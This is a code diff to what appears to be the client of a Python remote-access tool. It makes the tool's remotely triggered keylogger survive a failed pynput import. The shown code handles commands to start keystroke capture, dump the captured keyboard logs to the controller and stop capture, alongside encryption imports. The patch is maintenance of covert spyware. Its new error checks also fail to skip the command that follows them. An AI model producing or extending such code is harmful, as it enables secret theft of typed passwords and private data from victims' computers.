@@ -15,7 +15,11 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
-from pynput.keyboard import Key, Listener
+try:
+    from pynput.keyboard import Key, Listener
+    _pynput = True
+except Exception as e:
+    _pynput = False
 
 logging.basicConfig(level=logging.CRITICAL)
 
@@ -247,6 +251,9 @@ class Client(object):
                 continue
 
             if data[0] == '--k start':
+                if not _pynput:
+                    self.send(b'Keylogger is disabled due to import error.')
+
                 if not KeyListener.running:
                     KeyListener.start()
                     self.send(b'Started Keylogger\n')
@@ -255,6 +262,8 @@ class Client(object):
                 continue
                 
             if data[0] == '--k dump':
+                if not _pynput:
+                    self.send(b'Keylogger is disabled due to import error.')
                 global KeyboardLogs
 
                 if not KeyListener.running:
@@ -264,6 +273,8 @@ class Client(object):
                 continue
             
             if data[0] == '--k stop':
+                if not _pynput:
+                    self.send(b'Keylogger is disabled due to import error.')
                 if KeyListener.running:
                     KeyListener.stop()
                     threading.Thread.__init__(KeyListener) # re-initialise thread
